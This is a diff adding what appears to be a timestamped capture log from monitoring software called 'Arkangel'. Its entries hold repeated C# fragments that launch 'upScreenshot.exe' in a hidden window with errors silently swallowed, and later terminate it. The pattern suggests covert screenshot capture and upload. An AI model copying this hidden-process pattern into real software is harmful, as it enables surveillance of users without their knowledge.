@@ -1,0 +1,78 @@
+
+13_20_25
+C:\Program Files\Arkangel Team\Arkangel\Logs
+13_27_17
+C:\Program Files\Arkangel Team\Arkangel\Logs
+13_30_04
+C:\Program Files\Arkangel Team\Arkangel\Logs
+13_32_12
+C:\Program Files\Arkangel Team\Arkangel\Logs
+13_36_56
+                    ReadOnlyCollection<string> autho = new ReadOnlyCollection<string>(s);
+
+13_38_52
+  try
+                    {
+                        ProcessStartInfo startupload = new ProcessStartInfo();
+                        startupload.WorkingDirectory = @"..\..\module\";
+                        startupload.FileName = "upScreenshot.exe";
+                        startupload.WindowStyle = ProcessWindowStyle.Hidden;
+                        Process.Start(startupload);
+                    }
+                    catch { }
+13_40_15
+  try
+                    {
+                        ProcessStartInfo startupload = new ProcessStartInfo();
+                        startupload.WorkingDirectory = @"..\..\module\";
+                        startupload.FileName = "upScreenshot.exe";
+                        startupload.WindowStyle = ProcessWindowStyle.Hidden;
+                        Process.Start(startupload);
+                    }
+                    catch { }
+13_45_33
+  try
+                    {
+                        ProcessStartInfo startupload = new ProcessStartInfo();
+                        startupload.WorkingDirectory = @"..\..\module\";
+                        startupload.FileName = "upScreenshot.exe";
+                        startupload.WindowStyle = ProcessWindowStyle.Hidden;
+                        Process.Start(startupload);
+                    }
+                    catch { }
+13_52_21
+ try
+                {
+                    Functions.EndTask("upScreenshot.exe");
+                }
+                catch { }
+13_55_51
+  try
+                {
+                    Functions.EndTask("upScreenshot.exe");
+                }
+                catch { }
+14_00_02
+  try
+                {
+                    Functions.EndTask("upScreenshot.exe");
+                }
+                catch { }
+14_02_34
+  try
+                {
+                    Functions.EndTask("upScreenshot.exe");
+                }
+                catch { }
+14_05_13
+  try
+                {
+                    Functions.EndTask("upScreenshot.exe");
+                }
+                catch { }
+14_07_22
+  try
+                {
+                    Functions.EndTask("upScreenshot.exe");
+                }
+                catch { }
